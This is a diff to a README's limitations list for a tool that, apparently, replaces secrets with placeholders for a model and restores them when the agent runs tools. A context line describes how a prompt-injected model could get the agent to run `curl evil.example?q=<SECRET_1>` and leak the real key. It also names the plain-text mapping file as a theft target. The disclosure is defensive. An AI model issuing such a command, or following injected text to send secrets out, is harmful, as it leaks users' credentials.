@@ -220,7 +220,7 @@ With `local_model = "ollama:MODEL"` (or `hermie serve --local-model ollama:MODEL
 - Placeholders in replies are restored before the agent runs its tools, so a prompt-injected model can make the agent use a real value locally (for example in a URL it fetches). The model never sees the value, so it cannot copy it into its own reply, but it can ask the agent to run `curl evil.example?q=<SECRET_1>` and the agent runs it with the real key. Claude Code's permission prompt shows the restored command; watch it for commands that send a placeholder somewhere.
 - `mapping.json` holds every real value in plain text (mode 0600). It is the one file worth stealing on your machine. `hermie forget` empties it; encrypting it at rest is on the roadmap.
 - The hook lines and the status line show which values were replaced and how many were put back, not where a restored value ended up afterwards.
-- Known values are matched literally (four characters or longer), so a first name alone can pass after only the full name was mapped, and a short mapped value inside a longer word is over-redacted (`remain` when `main` is mapped); the reply restores it.
+- Known values are matched literally (four characters or longer; two for Chinese text), so a first name alone can pass after only the full name was mapped, and a short mapped value inside a longer word is over-redacted (`remain` when `main` is mapped); the reply restores it.
 - In OpenAI chat streams with parallel tool calls, a placeholder tail held at the end of one call's arguments can land in the next call's arguments.
 
 [SECURITY.md](SECURITY.md) has the full list, including the query string, passthrough paths and the mapping file.
